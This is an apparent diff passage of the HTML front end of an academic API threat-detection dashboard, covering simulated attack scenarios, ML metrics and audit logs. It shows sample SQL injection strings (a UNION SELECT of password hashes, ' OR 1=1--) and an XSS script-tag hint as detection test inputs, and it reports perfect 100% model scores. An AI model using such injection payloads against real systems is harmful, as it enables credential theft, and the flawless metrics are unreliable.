+                                <select id="statusFilter" class="form-select form-select-cyber" onchange="filterTraffic()">
+                                    <option value="ALL">All Status Codes</option>
+                                    <option value="200">200 OK</option>
+                                    <option value="201">201 Created</option>
+                                    <option value="400">400 Bad Request</option>
+                                    <option value="401">401 Unauthorized</option>
+                                    <option value="403">403 Forbidden</option>
+                                    <option value="429">429 Rate Limited</option>
+                                    <option value="500">500 Server Error</option>
+                                </select>
+                            </div>
+                            <div class="col-6 col-md-1 text-md-end">
+                                <span id="trafficCountBadge" class="badge bg-dark border border-secondary text-cyan font-mono small py-2 px-2">
+                                    40 requests
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Traffic Data Table -->
+                    <div class="soc-card p-0 mb-4">
+                        <div class="table-soc-container">
+                            <table class="table-soc">
+                                <thead>
+                                    <tr>
+                                        <th>Request ID</th>
+                                        <th>Timestamp</th>
+                                        <th>Method</th>
+                                        <th>API Endpoint</th>
+                                        <th>Source IP</th>
+                                        <th>Status</th>
+                                        <th>Latency</th>
+                                        <th>Classification</th>
+                                        <th>Risk Score</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="trafficTableBody"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </section>
+
+
+                <!-- ========================================== -->
+                <!-- 3. THREAT DETECTION & ALERTS VIEW          -->
+                <!-- ========================================== -->
+                <section id="view-alerts" class="d-none">
+                    <div class="d-flex flex-wrap justify-content-between align-items-center mb-4">
+                        <div>
+                            <h3 class="fw-bold text-white mb-0">Security Incidents & Threat Alerts</h3>
+                            <p class="text-muted small mb-0">Active threat triage, behavioral anomalies, and automated SOC incident remediation playbooks</p>
+                        </div>
+                        <div class="d-flex align-items-center gap-2 mt-2 mt-sm-0">
+                            <span class="badge bg-dark border border-secondary text-cyan font-mono py-2 px-3" id="totalAlertsCount">
+                                3 Incidents
+                            </span>
+                            <button onclick="switchTab('simulation')" class="btn btn-sm btn-cyber">
+                                <i class="bi bi-play-circle-fill"></i> Simulate New Threat
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Filters -->
+                    <div class="soc-card mb-4 p-3">
+                        <div class="row g-2 align-items-center">
+                            <div class="col-md-5">
+                                <div class="input-group">
+                                    <span class="input-group-text bg-black border-secondary text-cyan"><i class="bi bi-search"></i></span>
+                                    <input type="text" id="alertSearch" class="form-control form-control-cyber" placeholder="Search by title, IP, endpoint, or category..." oninput="filterAlerts()">
+                                </div>
+                            </div>
+                            <div class="col-6 col-md-3">
+                                <select id="alertSeverityFilter" class="form-select form-select-cyber" onchange="filterAlerts()">
+                                    <option value="ALL">All Severities</option>
+                                    <option value="Critical">Critical Severity (80-100)</option>
+                                    <option value="High">High Severity (60-79)</option>
+                                    <option value="Medium">Medium Severity (30-59)</option>
+                                    <option value="Low">Low Severity (0-29)</option>
+                                </select>
+                            </div>
+                            <div class="col-6 col-md-4">
+                                <select id="alertStatusFilter" class="form-select form-select-cyber" onchange="filterAlerts()">
+                                    <option value="ALL">All Incident Statuses</option>
+                                    <option value="Active" selected>Active Incidents</option>
+                                    <option value="Investigating">Under Investigation</option>
+                                    <option value="Mitigated">Mitigated (Blocked)</option>
+                                    <option value="Resolved">Resolved</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Alerts Grid -->
+                    <div class="row g-3" id="alertsCardsContainer"></div>
+                </section>
+
+
+                <!-- ========================================== -->
+                <!-- 4. ATTACK SIMULATION LAB VIEW              -->
+                <!-- ========================================== -->
+                <section id="view-simulation" class="d-none">
+                    <div class="d-flex flex-wrap justify-content-between align-items-center mb-4">
+                        <div>
+                            <h3 class="fw-bold text-white mb-0">Adversarial Attack Simulation Lab</h3>
+                            <p class="text-muted small mb-0">Simulate synthetic API attack vectors locally to evaluate real-time ML detection algorithms and automated defensive actions</p>
+                        </div>
+                        <div class="d-flex align-items-center gap-2 mt-2 mt-sm-0">
+                            <span class="badge bg-danger bg-opacity-25 border border-danger text-danger font-mono py-2 px-3">
+                                <i class="bi bi-shield-lock-fill me-1"></i> SANDBOX ENVIRONMENT: SAFE LOCAL SIMULATION
+                            </span>
+                        </div>
+                    </div>
+
+                    <!-- Disclaimer -->
+                    <div class="alert alert-dark border border-secondary text-light p-3 mb-4 rounded-3 d-flex align-items-center gap-3">
+                        <div class="fs-2 text-warning"><i class="bi bi-mortarboard-fill"></i></div>
+                        <div>
+                            <div class="fw-bold text-white">Academic Project Demonstration Environment</div>
+                            <div class="small text-muted">
+                                All simulation triggers dispatch synthetic telemetry packets processed through the dual AI threat engine.
+                                No network packets or malicious traffic are dispatched to external systems.
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 5 Scenario Cards -->
+                    <div class="row g-3 mb-4">
+                        <div class="col-md-6 col-lg-4">
+                            <div class="sim-scenario-card border-success">
+                                <div>
+                                    <div class="d-flex justify-content-between align-items-center mb-2">
+                                        <span class="badge bg-success bg-opacity-25 text-emerald border border-success font-mono">SCENARIO 01</span>
+                                        <span class="badge bg-dark border border-secondary text-muted">Baseline Traffic</span>
+                                    </div>
+                                    <h5 class="text-white fw-bold mb-1">Standard API Traffic</h5>
+                                    <p class="small text-muted mb-2">Legitimate client browsing and transactional requests across public product catalogs and user profile endpoints.</p>
+                                    <div class="p-2 rounded bg-black border border-secondary mb-3 small font-mono">
+                                        <div class="text-muted">Target: <span class="text-light">GET /api/v1/products</span></div>
+                                        <div class="text-muted">Rate: <span class="text-emerald">3-8 req/min (Normal)</span></div>
+                                        <div class="text-muted">Expected Risk: <span class="text-emerald">&lt; 25 (Low / Safe)</span></div>
+                                    </div>
+                                </div>
+                                <button class="btn btn-outline-success w-100" onclick="triggerClientSimulation('normal')">
+                                    <i class="bi bi-play-fill me-1"></i> Simulate Normal Traffic
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="col-md-6 col-lg-4">
+                            <div class="sim-scenario-card border-danger">
+                                <div>
+                                    <div class="d-flex justify-content-between align-items-center mb-2">
+                                        <span class="badge bg-danger bg-opacity-25 text-crimson border border-danger font-mono">SCENARIO 02</span>
+                                        <span class="badge bg-dark border border-secondary text-danger">Authentication Threat</span>
+                                    </div>
+                                    <h5 class="text-white fw-bold mb-1">Brute Force / Stuffing</h5>
+                                    <p class="small text-muted mb-2">High-frequency password guessing attack targeting user login gateway from a single malicious source IP address.</p>
+                                    <div class="p-2 rounded bg-black border border-secondary mb-3 small font-mono">
+                                        <div class="text-muted">Target: <span class="text-light">POST /api/v1/auth/login</span></div>
+                                        <div class="text-muted">Failed Logins: <span class="text-crimson">8 consecutive 401s</span></div>
+                                        <div class="text-muted">Expected Risk: <span class="text-crimson">85-95 (Critical)</span></div>
+                                    </div>
+                                </div>
+                                <button class="btn btn-outline-danger w-100" onclick="triggerClientSimulation('brute_force')">
+                                    <i class="bi bi-key-fill me-1"></i> Launch Brute Force Attack
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="col-md-6 col-lg-4">
+                            <div class="sim-scenario-card border-warning">
+                                <div>
+                                    <div class="d-flex justify-content-between align-items-center mb-2">
+                                        <span class="badge bg-warning bg-opacity-25 text-amber border border-warning font-mono">SCENARIO 03</span>
+                                        <span class="badge bg-dark border border-secondary text-warning">Volumetric Threat</span>
+                                    </div>
+                                    <h5 class="text-white fw-bold mb-1">Traffic Spike / DoS</h5>
+                                    <p class="small text-muted mb-2">Burst of 20 concurrent requests flooding analytics endpoints, inducing rate-limit throttling and latency degradation.</p>
+                                    <div class="p-2 rounded bg-black border border-secondary mb-3 small font-mono">
+                                        <div class="text-muted">Target: <span class="text-light">GET /api/v1/analytics/reports</span></div>
+                                        <div class="text-muted">Rate: <span class="text-amber">180+ req/min (HTTP 429)</span></div>
+                                        <div class="text-muted">Expected Risk: <span class="text-amber">80-92 (Critical)</span></div>
+                                    </div>
+                                </div>
+                                <button class="btn btn-outline-warning w-100" onclick="triggerClientSimulation('dos_spike')">
+                                    <i class="bi bi-speedometer2 me-1"></i> Launch DoS Traffic Spike
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="col-md-6 col-lg-6">
+                            <div class="sim-scenario-card border-info">
+                                <div>
+                                    <div class="d-flex justify-content-between align-items-center mb-2">
+                                        <span class="badge bg-info bg-opacity-25 text-cyan border border-info font-mono">SCENARIO 04</span>
+                                        <span class="badge bg-dark border border-secondary text-cyan">Access Control Threat</span>
+                                    </div>
+                                    <h5 class="text-white fw-bold mb-1">Unauthorized Access / BOLA Probe</h5>
+                                    <p class="small text-muted mb-2">Attacker presents forged or expired JWT bearer tokens attempting to access restricted administrative and tenant endpoints.</p>
+                                    <div class="p-2 rounded bg-black border border-secondary mb-3 small font-mono">
+                                        <div class="text-muted">Target: <span class="text-light">/api/v1/admin/users/export</span></div>
+                                        <div class="text-muted">Auth Status: <span class="text-cyan">Forged / Tampered Bearer Token</span></div>
+                                        <div class="text-muted">Expected Risk: <span class="text-cyan">70-85 (High Severity)</span></div>
+                                    </div>
+                                </div>
+                                <button class="btn btn-outline-info w-100" onclick="triggerClientSimulation('unauthorized')">
+                                    <i class="bi bi-person-x-fill me-1"></i> Simulate BOLA / Unauthorized Probe
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="col-md-6 col-lg-6">
+                            <div class="sim-scenario-card border-danger">
+                                <div>
+                                    <div class="d-flex justify-content-between align-items-center mb-2">
+                                        <span class="badge bg-danger bg-opacity-25 text-crimson border border-danger font-mono">SCENARIO 05</span>
+                                        <span class="badge bg-dark border border-secondary text-danger">Injection Threat</span>
+                                    </div>
+                                    <h5 class="text-white fw-bold mb-1">Suspicious Payload Injection (SQLi / XSS)</h5>
+                                    <p class="small text-muted mb-2">Inbound HTTP payload containing malicious SQL query unions or cross-site scripting script tag injections.</p>
+                                    <div class="p-2 rounded bg-black border border-secondary mb-3 small font-mono">
+                                        <div class="text-muted">Payload: <span class="text-crimson text-break">' UNION SELECT username, password_hash FROM users--</span></div>
+                                        <div class="text-muted">Signature: <span class="text-crimson">Regex Heuristic 8.5/10</span></div>
+                                        <div class="text-muted">Expected Risk: <span class="text-crimson">90-99 (Critical / Instant Block)</span></div>
+                                    </div>
+                                </div>
+                                <div class="d-flex gap-2">
+                                    <button class="btn btn-outline-danger flex-grow-1" onclick="triggerClientSimulation('payload_sqli')">
+                                        <i class="bi bi-database-fill-slash me-1"></i> Simulate SQLi
+                                    </button>
+                                    <button class="btn btn-outline-warning flex-grow-1" onclick="triggerClientSimulation('payload_xss')">
+                                        <i class="bi bi-code-slash me-1"></i> Simulate XSS
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Simulation Execution Console -->
+                    <div class="row g-3">
+                        <div class="col-lg-7">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title">
+                                        <i class="bi bi-terminal-fill text-cyan"></i>
+                                        <span>Real-Time Simulation Execution Stream</span>
+                                    </div>
+                                    <button onclick="clearConsole()" class="btn btn-sm btn-cyber-outline py-0 px-2 small">
+                                        <i class="bi bi-trash"></i> Clear Console
+                                    </button>
+                                </div>
+                                <div id="simConsole" class="simulation-console">
+                                    <div class="console-line info"><span class="text-muted">[INIT]</span> AI SENTINEL Adversarial Attack Simulation Lab initialized.</div>
+                                    <div class="console-line info"><span class="text-muted">[READY]</span> Click any attack scenario button above to dispatch synthetic packets.</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-5">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title">
+                                        <i class="bi bi-clock-history text-amber"></i>
+                                        <span>Simulation Run History</span>
+                                    </div>
+                                    <button onclick="switchTab('dashboard')" class="btn btn-sm btn-cyber-outline py-0 px-2 small">
+                                        Dashboard <i class="bi bi-arrow-right"></i>
+                                    </button>
+                                </div>
+                                <div class="table-soc-container">
+                                    <table class="table-soc">
+                                        <thead>
+                                            <tr>
+                                                <th>Time</th>
+                                                <th>Scenario</th>
+                                                <th>Risk</th>
+                                                <th>Audit Summary</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody id="simHistoryTbody"></tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+
+                <!-- ========================================== -->
+                <!-- 5. AI / ML MODELS VIEW                     -->
+                <!-- ========================================== -->
+                <section id="view-models" class="d-none">
+                    <div class="d-flex flex-wrap justify-content-between align-items-center mb-4">
+                        <div>
+                            <h3 class="fw-bold text-white mb-0">AI / Machine Learning Threat Intelligence</h3>
+                            <p class="text-muted small mb-0">Performance diagnostics, classification metrics, confusion matrix, and feature weight importances</p>
+                        </div>
+                        <div class="d-flex align-items-center gap-2 mt-2 mt-sm-0">
+                            <span class="badge bg-dark border border-secondary text-cyan font-mono py-2 px-3">
+                                <i class="bi bi-cpu-fill me-1"></i> DUAL-MODEL ENSEMBLE ENGINE
+                            </span>
+                        </div>
+                    </div>
+
+                    <!-- Metrics Row -->
+                    <div class="row g-3 mb-4">
+                        <div class="col-6 col-lg-3">
+                            <div class="kpi-card kpi-cyan">
+                                <div class="kpi-header"><span>Model Accuracy</span><div class="kpi-icon-wrap kpi-icon-cyan"><i class="bi bi-bullseye"></i></div></div>
+                                <div class="kpi-value text-cyan">100.0%</div>
+                                <div class="kpi-subtext">Held-out test split (20%)</div>
+                            </div>
+                        </div>
+                        <div class="col-6 col-lg-3">
+                            <div class="kpi-card kpi-green">
+                                <div class="kpi-header"><span>Weighted Precision</span><div class="kpi-icon-wrap kpi-icon-green"><i class="bi bi-check2-circle"></i></div></div>
+                                <div class="kpi-value text-emerald">100.0%</div>
+                                <div class="kpi-subtext">True positives / predicted</div>
+                            </div>
+                        </div>
+                        <div class="col-6 col-lg-3">
+                            <div class="kpi-card kpi-amber">
+                                <div class="kpi-header"><span>Weighted Recall</span><div class="kpi-icon-wrap kpi-icon-amber"><i class="bi bi-binoculars-fill"></i></div></div>
+                                <div class="kpi-value text-amber">100.0%</div>
+                                <div class="kpi-subtext">Sensitivity across attack classes</div>
+                            </div>
+                        </div>
+                        <div class="col-6 col-lg-3">
+                            <div class="kpi-card kpi-cyan">
+                                <div class="kpi-header"><span>F1-Score</span><div class="kpi-icon-wrap kpi-icon-cyan"><i class="bi bi-award-fill"></i></div></div>
+                                <div class="kpi-value text-cyan">100.0%</div>
+                                <div class="kpi-subtext">Harmonic mean of prec & recall</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Architecture Overview -->
+                    <div class="row g-3 mb-4">
+                        <div class="col-lg-6">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title text-cyan"><i class="bi bi-diagram-3-fill"></i> Model 1: Random Forest Classifier</div>
+                                    <span class="badge bg-success font-mono">FITTED & ACTIVE</span>
+                                </div>
+                                <p class="small text-muted mb-3">Supervised ensemble classifier trained on multivariate behavioral features to categorize API traffic into Normal (0), Suspicious (1), and Potential Attack (2).</p>
+                                <div class="row g-2 small font-mono">
+                                    <div class="col-6"><div class="p-2 rounded bg-black border border-secondary"><div class="text-muted">Estimators:</div><div class="text-white fw-bold">100 Decision Trees</div></div></div>
+                                    <div class="col-6"><div class="p-2 rounded bg-black border border-secondary"><div class="text-muted">Max Depth:</div><div class="text-white fw-bold">10 Levels</div></div></div>
+                                    <div class="col-6"><div class="p-2 rounded bg-black border border-secondary"><div class="text-muted">Training Samples:</div><div class="text-cyan fw-bold">2,000</div></div></div>
+                                    <div class="col-6"><div class="p-2 rounded bg-black border border-secondary"><div class="text-muted">Test Split:</div><div class="text-cyan fw-bold">500 Samples</div></div></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-lg-6">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title text-amber"><i class="bi bi-radar"></i> Model 2: Isolation Forest</div>
+                                    <span class="badge bg-success font-mono">FITTED & ACTIVE</span>
+                                </div>
+                                <p class="small text-muted mb-3">Unsupervised anomaly detection algorithm that isolates out-of-distribution observation vectors to discover zero-day outlier patterns.</p>
+                                <div class="row g-2 small font-mono">
+                                    <div class="col-6"><div class="p-2 rounded bg-black border border-secondary"><div class="text-muted">Isolation Trees:</div><div class="text-white fw-bold">100 Trees</div></div></div>
+                                    <div class="col-6"><div class="p-2 rounded bg-black border border-secondary"><div class="text-muted">Contamination:</div><div class="text-white fw-bold">0.15 (15%)</div></div></div>
+                                    <div class="col-6"><div class="p-2 rounded bg-black border border-secondary"><div class="text-muted">Metric Output:</div><div class="text-amber fw-bold">Scaled Anomaly (0-100)</div></div></div>
+                                    <div class="col-6"><div class="p-2 rounded bg-black border border-secondary"><div class="text-muted">Objective:</div><div class="text-amber fw-bold">Zero-Day Discovery</div></div></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Confusion Matrix & Feature Weights -->
+                    <div class="row g-3 mb-4">
+                        <div class="col-lg-5">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title text-white"><i class="bi bi-grid-3x3 text-cyan"></i> Test Split Confusion Matrix</div>
+                                    <span class="badge bg-dark border border-secondary text-muted font-mono small">Scikit-learn</span>
+                                </div>
+                                <p class="small text-muted">Verification of prediction accuracy against ground-truth labels on the held-out test split:</p>
+                                <div class="py-2">
+                                    <table class="cm-table">
+                                        <thead>
+                                            <tr>
+                                                <th class="text-muted small">Actual \ Pred</th>
+                                                <th class="text-cyan small">Pred Normal</th>
+                                                <th class="text-cyan small">Pred Suspicious</th>
+                                                <th class="text-cyan small">Pred Attack</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td class="text-muted small fw-bold text-start">True Normal</td>
+                                                <td><div class="cm-cell cm-diagonal">325</div></td>
+                                                <td><div class="cm-cell bg-dark text-muted">0</div></td>
+                                                <td><div class="cm-cell bg-dark text-muted">0</div></td>
+                                            </tr>
+                                            <tr>
+                                                <td class="text-muted small fw-bold text-start">True Suspicious</td>
+                                                <td><div class="cm-cell bg-dark text-muted">0</div></td>
+                                                <td><div class="cm-cell cm-diagonal">100</div></td>
+                                                <td><div class="cm-cell bg-dark text-muted">0</div></td>
+                                            </tr>
+                                            <tr>
+                                                <td class="text-muted small fw-bold text-start">True Attack</td>
+                                                <td><div class="cm-cell bg-dark text-muted">0</div></td>
+                                                <td><div class="cm-cell bg-dark text-muted">0</div></td>
+                                                <td><div class="cm-cell cm-diagonal">75</div></td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div class="d-flex justify-content-center gap-4 mt-3 small font-mono">
+                                    <span class="d-flex align-items-center gap-1"><span class="cm-cell cm-diagonal p-1 px-2">500</span> Correct (100%)</span>
+                                    <span class="d-flex align-items-center gap-1"><span class="cm-cell cm-off-diagonal p-1 px-2">0</span> Misclassified</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-lg-7">
+                            <div class="soc-card h-100">
+                                <div class="soc-card-header">
+                                    <div class="soc-card-title text-white"><i class="bi bi-bar-chart-steps text-cyan"></i> Feature Weight Importances</div>
+                                    <span class="badge bg-dark border border-secondary text-cyan font-mono small">Gini Impurity</span>
+                                </div>
+                                <p class="small text-muted">Relative importance of each feature in determining attack vs benign traffic classifications:</p>
+                                <div style="height: 260px; position: relative;">
+                                    <canvas id="featureImportanceChart"></canvas>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+
+                <!-- ========================================== -->
+                <!-- 6. AUDIT EVENT LOGS VIEW                   -->
+                <!-- ========================================== -->
+                <section id="view-logs" class="d-none">
+                    <div class="d-flex flex-wrap justify-content-between align-items-center mb-4">
+                        <div>
+                            <h3 class="fw-bold text-white mb-0">SOC Security Audit & Event Logs</h3>
+                            <p class="text-muted small mb-0">Immutable chronological audit trail of authentication events, ML detections, policy blocks, and system operations</p>
+                        </div>
+                        <div class="d-flex align-items-center gap-2 mt-2 mt-sm-0">
+                            <button onclick="resetData()" class="btn btn-sm btn-cyber-outline">
+                                <i class="bi bi-arrow-repeat"></i> Reset & Reseed Baseline
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Search and filters -->
+                    <div class="soc-card mb-4 p-3">
+                        <div class="row g-2 align-items-center">
+                            <div class="col-md-6">
+                                <div class="input-group">
+                                    <span class="input-group-text bg-black border-secondary text-cyan"><i class="bi bi-search"></i></span>
+                                    <input type="text" id="logSearch" class="form-control form-control-cyber" placeholder="Search logs by IP, endpoint, detection result..." oninput="filterLogs()">
+                                </div>
+                            </div>
+                            <div class="col-6 col-md-4">
+                                <select id="logTypeFilter" class="form-select form-select-cyber" onchange="filterLogs()">
+                                    <option value="ALL">All Event Types</option>
+                                    <option value="DETECTION">DETECTION (Threat alerts)</option>
+                                    <option value="BLOCK">BLOCK (Mitigated/WAF dropped)</option>
+                                    <option value="AUTH">AUTH (Login & session operations)</option>
+                                    <option value="SIMULATION">SIMULATION (Lab attack triggers)</option>
+                                    <option value="SYSTEM">SYSTEM (Engine startup & status)</option>
+                                    <option value="TRAFFIC">TRAFFIC (Sample telemetry)</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="soc-card p-0 mb-4">
+                        <div class="table-soc-container">
+                            <table class="table-soc">
+                                <thead>
+                                    <tr>
+                                        <th>Timestamp</th>
+                                        <th>Event Type</th>
+                                        <th>Source IP</th>
+                                        <th>Endpoint</th>
+                                        <th>Risk Score</th>
+                                        <th>Detection Result</th>
+                                        <th>Action Taken</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="logsTableBody"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </section>
+
             </div>
-        </footer>
+        </main>
     </div>
 
+    <!-- Quick Attack Dispatcher Modal -->
+    <div class="modal fade" id="quickSimModal" tabindex="-1" aria-labelledby="quickSimModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content bg-dark border-secondary text-white">
+                <div class="modal-header border-secondary">
+                    <h5 class="modal-title text-cyan" id="quickSimModalLabel"><i class="bi bi-shield-shaded me-1"></i> Quick Attack Dispatcher</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <p class="small text-muted">Select an educational scenario to simulate inbound API events and observe real-time AI/ML classification and risk scoring.</p>
+                    <div class="d-grid gap-2">
+                        <button class="btn btn-outline-success text-start d-flex align-items-center justify-content-between p-2" onclick="triggerClientSimulation('normal'); bootstrap.Modal.getInstance(document.getElementById('quickSimModal')).hide();">
+                            <span><i class="bi bi-check-circle me-2"></i>Normal Business Traffic</span><span class="badge bg-success font-mono">Low Risk</span>
+                        </button>
+                        <button class="btn btn-outline-danger text-start d-flex align-items-center justify-content-between p-2" onclick="triggerClientSimulation('brute_force'); bootstrap.Modal.getInstance(document.getElementById('quickSimModal')).hide();">
+                            <span><i class="bi bi-key-fill me-2"></i>Brute Force Attack</span><span class="badge bg-danger font-mono">Critical</span>
+                        </button>
+                        <button class="btn btn-outline-warning text-start d-flex align-items-center justify-content-between p-2" onclick="triggerClientSimulation('dos_spike'); bootstrap.Modal.getInstance(document.getElementById('quickSimModal')).hide();">
+                            <span><i class="bi bi-speedometer me-2"></i>Traffic Spike / DoS</span><span class="badge bg-warning text-dark font-mono">High</span>
+                        </button>
+                        <button class="btn btn-outline-info text-start d-flex align-items-center justify-content-between p-2" onclick="triggerClientSimulation('unauthorized'); bootstrap.Modal.getInstance(document.getElementById('quickSimModal')).hide();">
+                            <span><i class="bi bi-person-x me-2"></i>Unauthorized Access Probe</span><span class="badge bg-info text-dark font-mono">High</span>
+                        </button>
+                        <button class="btn btn-outline-danger text-start d-flex align-items-center justify-content-between p-2" onclick="triggerClientSimulation('payload_sqli'); bootstrap.Modal.getInstance(document.getElementById('quickSimModal')).hide();">
+                            <span><i class="bi bi-code-slash me-2"></i>Malicious Payload (SQLi/XSS)</span><span class="badge bg-danger font-mono">Critical</span>
+                        </button>
+                    </div>
+                </div>
+                <div class="modal-footer border-secondary">
+                    <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Request Inspector Modal -->
+    <div class="modal fade" id="requestInspectModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-lg modal-dialog-centered">
+            <div class="modal-content bg-dark border-secondary text-white">
+                <div class="modal-header border-secondary">
+                    <div class="d-flex align-items-center gap-2">
+                        <i class="bi bi-cpu text-cyan fs-4"></i>
+                        <div>
+                            <h5 class="modal-title text-white mb-0">API Request Telemetry & AI Inspection</h5>
+                            <div class="small font-mono text-cyan" id="inspectReqId">REQ-000000</div>
+                        </div>
+                    </div>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="row g-3 mb-3">
+                        <div class="col-md-3"><div class="p-2 rounded bg-black border border-secondary text-center"><div class="text-muted small">METHOD</div><div class="fw-bold font-mono text-cyan" id="inspectMethod">GET</div></div></div>
+                        <div class="col-md-3"><div class="p-2 rounded bg-black border border-secondary text-center"><div class="text-muted small">STATUS CODE</div><div class="fw-bold font-mono text-white" id="inspectStatus">200</div></div></div>
+                        <div class="col-md-3"><div class="p-2 rounded bg-black border border-secondary text-center"><div class="text-muted small">LATENCY</div><div class="fw-bold font-mono text-amber" id="inspectLatency">45 ms</div></div></div>
+                        <div class="col-md-3"><div class="p-2 rounded bg-black border border-secondary text-center"><div class="text-muted small">PAYLOAD SIZE</div><div class="fw-bold font-mono text-light" id="inspectPayloadSize">128 B</div></div></div>
+                    </div>
+
+                    <div class="p-3 rounded bg-black border border-secondary mb-3">
+                        <div class="row g-2 small font-mono">
+                            <div class="col-sm-3 text-muted">Endpoint:</div><div class="col-sm-9 text-light text-break" id="inspectEndpoint">/api/v1/</div>
+                            <div class="col-sm-3 text-muted">Client IP:</div><div class="col-sm-9 text-cyan" id="inspectIp">127.0.0.1</div>
+                            <div class="col-sm-3 text-muted">User-Agent:</div><div class="col-sm-9 text-muted text-break" id="inspectUserAgent">Mozilla/5.0</div>
+                            <div class="col-sm-3 text-muted">Timestamp:</div><div class="col-sm-9 text-light" id="inspectTimestamp">2026-11-01</div>
+                        </div>
+                    </div>
+
+                    <div class="soc-card mb-3 p-3">
+                        <div class="soc-card-title text-cyan mb-2"><i class="bi bi-shield-check"></i> Machine Learning Threat Evaluation</div>
+                        <div class="row g-3">
+                            <div class="col-sm-6"><div class="small text-muted">ML Classification:</div><div id="inspectClassification" class="mt-1"></div></div>
+                            <div class="col-sm-6"><div class="small text-muted">Composite Risk Score:</div><div id="inspectRiskScore" class="mt-1"></div></div>
+                            <div class="col-sm-6"><div class="small text-muted">Isolation Forest Anomaly Score:</div><div id="inspectAnomalyScore" class="font-mono text-white fw-bold">0.0 / 100</div></div>
+                            <div class="col-sm-6"><div class="small text-muted">Enforcement Action:</div><div id="inspectBlocked" class="mt-1"></div></div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="small fw-bold text-light mb-2"><i class="bi bi-lightbulb text-warning me-1"></i> Detection Reasoning & Heuristics:</div>
+                        <ul class="list-group" id="inspectReasonsList"></ul>
+                    </div>
+                </div>
+                <div class="modal-footer border-secondary">
+                    <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ingest Custom API Request Modal -->
+    <div class="modal fade" id="customRequestModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content bg-dark border-secondary text-white">
+                <div class="modal-header border-secondary">
+                    <h5 class="modal-title text-cyan"><i class="bi bi-terminal me-2"></i> Ingest Test API Request</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <p class="small text-muted">Submit custom HTTP telemetry parameters directly to the dual-model AI detection engine to observe classification and risk calculation.</p>
+                    <form id="customReqForm" onsubmit="handleCustomSubmit(event)">
+                        <div class="row g-2 mb-2">
+                            <div class="col-4">
+                                <label class="form-label small text-muted">Method</label>
+                                <select id="cMethod" class="form-select form-select-cyber">
+                                    <option value="GET">GET</option><option value="POST" selected>POST</option><option value="PUT">PUT</option><option value="DELETE">DELETE</option>
+                                </select>
+                            </div>
+                            <div class="col-8">
+                                <label class="form-label small text-muted">Endpoint</label>
+                                <input type="text" id="cEndpoint" class="form-control form-control-cyber" value="/api/v1/auth/login">
+                            </div>
+                        </div>
+                        <div class="row g-2 mb-2">
+                            <div class="col-6">
+                                <label class="form-label small text-muted">Source IP</label>
+                                <input type="text" id="cIp" class="form-control form-control-cyber" value="198.51.100.99">
+                            </div>
+                            <div class="col-6">
+                                <label class="form-label small text-muted">Status Code</label>
+                                <input type="number" id="cStatus" class="form-control form-control-cyber" value="401">
+                            </div>
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label small text-muted">Payload / Body Data</label>
+                            <textarea id="cPayload" class="form-control form-control-cyber font-mono" rows="3" placeholder='{"username": "admin", "password": "password123"}'></textarea>
+                            <div class="form-text text-muted" style="font-size: 0.72rem;">Try inserting SQL syntax like <code>' OR 1=1--</code> or <code>&lt;script&gt;</code> to test heuristic triggers.</div>
+                        </div>
+                        <button type="submit" class="btn btn-cyber w-100"><i class="bi bi-cpu-fill"></i> Ingest & Score with AI Engine</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Notification Container -->
+    <div id="toastContainer" class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index: 1090;"></div>
+
+    <!-- Bootstrap 5 Bundle JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+
